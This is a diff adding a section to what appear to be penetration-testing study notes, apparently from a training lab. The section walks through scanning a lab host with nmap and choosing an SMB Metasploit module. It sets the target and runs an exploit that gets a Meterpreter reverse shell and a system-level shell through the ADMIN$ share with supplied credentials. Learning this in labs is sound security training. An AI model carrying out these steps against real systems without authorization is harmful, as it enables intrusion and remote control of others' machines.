@@ -156,3 +156,51 @@ Includes a PowerShell prompt (PS) showing the current directory.
 8. Close the Connection: `$client.Close();` Closes the TCP connection when finished.
 
 ## Automating Payloads & Delivery with Metasploit
+
+Metasploit, developed by Rapid7, is an automated attack framework that simplifies exploiting vulnerabilities using pre-built modules to deliver payloads and gain system access. It's widely used in cybersecurity, though some training environments limit its use due to how easy it makes exploitation.
+
+__Starting MSF__ 
+```
+sudo msfconsole
+```
+
+In this case, we will be using enumeration results from a nmap scan to pick a Metasploit module to use.
+__NMAP Scan__ 
+```
+nmap -sC -sV -Pn 10.129.164.25
+```
+In the output, we see several standard ports that are typically open on a Windows system by default. Remember that scanning and enumeration is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit.
+__Searching Within Metasploit__
+```
+search smb
+```
+
+We will see a long list of Matching Modules associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a Name, Disclosure Date, Rank, Check and Description.
+![image](https://github.com/user-attachments/assets/9a573134-4b3f-4845-a408-2c627cdf985e)
+
+__Option Selection__
+```
+use 56
+```
+__Examining an Exploit's Options__ 
+```
+options
+```
+
+__Setting Options__ 
+```
+set RHOSTS 10.129.180.71
+```
+These settings will ensure that our payload is delivered to the proper target (RHOSTS), uploaded to the default administrative share (ADMIN$) utilizing credentials (SMBPass & SMBUser), then initiate a reverse shell connection with our local host machine (LHOST).
+__Exploit Execution__
+```
+exploit
+```
+After we issue the exploit command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload. Metasploit reports back each step of this process, as seen in the output. We know this was successful because a stage was sent successfully, which established a Meterpreter shell session (meterpreter >) and a system-level shell session. 
+
+ use the shell command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.
+
+ __Interactive shell__
+```
+shell
+```
